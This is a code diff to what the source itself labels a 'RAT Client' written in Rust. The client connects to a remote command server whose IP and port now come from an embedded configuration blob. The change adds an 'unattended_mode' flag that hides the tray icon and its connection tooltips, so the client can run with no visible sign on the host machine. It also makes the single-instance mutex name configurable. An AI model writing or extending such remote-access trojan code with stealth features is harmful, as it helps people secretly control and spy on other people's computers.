@@ -11,11 +11,10 @@ use std::thread::sleep;
 pub mod features;
 pub mod handler;
 pub mod service;
-pub mod settings;
 
 use features::tray_icon;
 use handler::handle_command;
-use common::buffers::read_buffer;
+use common::{buffers::read_buffer, ClientConfig};
 use rand::{ rngs::OsRng, Rng };
 use rsa::pkcs8::DecodePublicKey;
 use rsa::Pkcs1v15Encrypt;
@@ -181,27 +180,46 @@ fn handle_server(
 }
 
 fn main() {
-    service::mutex::mutex_lock();
-    let is_connected = Arc::new(Mutex::new(false));
-    let tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
+    let config: ClientConfig = rmp_serde::from_read(std::io::Cursor::new(&CONFIG)).unwrap();
 
-    tray_icon.lock().unwrap().show();
+    println!("Client configuration: {:?}", config);
+
+
+    service::mutex::mutex_lock(&config.mutex);
+
+
+    let is_connected = Arc::new(Mutex::new(false));
+
+    let mut tray_icon = Arc::new(Mutex::new(TrayIcon::new()));
+
+    if !config.unattended_mode
+    {
+        tray_icon.lock().unwrap().show();
+    }
+
     loop {
+        let config_clone = config.clone();
         let is_connected_clone = is_connected.clone();
         let tray_icon_clone = tray_icon.clone();
         if *is_connected_clone.lock().unwrap() {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
+            if !config.unattended_mode
+            {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
+            }
             sleep(std::time::Duration::from_secs(5));
             continue;
         }
         else {
-            tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+            if !config.unattended_mode
+            {
+                tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Disconnected");
+            }
         }
 
 
         std::thread::spawn(move || {
             println!("Connecting to server...");
-            let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
+            let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
             if let Ok(str) = stream {
                 *is_connected_clone.lock().unwrap() = true;
                 handle_server(
